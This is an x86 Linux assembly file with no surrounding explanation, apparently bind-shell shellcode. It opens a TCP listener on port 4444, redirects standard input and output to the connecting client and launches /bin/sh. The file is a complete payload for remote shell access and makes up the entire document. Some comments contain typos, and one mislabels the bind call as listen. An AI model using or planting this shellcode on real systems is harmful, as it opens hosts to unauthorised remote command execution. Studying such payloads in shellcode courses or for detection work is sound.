global _start


section .text


_start:
	xor ebx, ebx ; zero ebx
	mul ebx ; xero eax and edx 
	mov al, 0x66 ; socket call 0x66
	mov bl, 0x1 ; sys_socket
	push edx ; int protocol -> IPPROTO_TCP
	push ebx ; int type -> SOCK_STREAM
	push 0x2 ; int domain -> AF_INET
	mov ecx, esp 
	int 0x80 ; sys_socketcall (SYS_SOCKET)
	mov edi, eax ; save socket fd 
		
	;addr socket
	push edx ; NULL padding
	push edx ; NULL padding
	push edx ; sin.addr (0.0.0.0)
	push word 0x5c11 ; prot 4444
	push word 0x2 ; AF_INET
	mov esi, esp

	;bind socket 
	mov al, 0x66 ;sys_socketcall 
	mov bl, 0x2 ;SYS_BIND
	push 0x10 ; socklen_t address len
	push esi ; const struckt socket addr
	push edi ; push socket fd
	mov ecx, esp 
	int 0x80 ; sys_socketcall (SYS_LISTEN)

	mov al, 0x66 
	mov bl, 0x4
	push edx 
	push edi
	mov ecx, esp
	int 0x80


	mov al, 0x66
	mov bl, 0x5
	push edx
	push edx 
	push edi
	mov ecx, esp
	int 0x80
	mov edi, eax

	xor ecx, ecx
	mov cl, 0x3
loop:
	xor eax, eax
	mov al,0x3f
	mov ebx, edi
	dec cl
	int 0x80
	jnz loop



	push edx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	push edx
	push ebx
	mov ecx, esp
	mov al, 0xb
	int 0x80
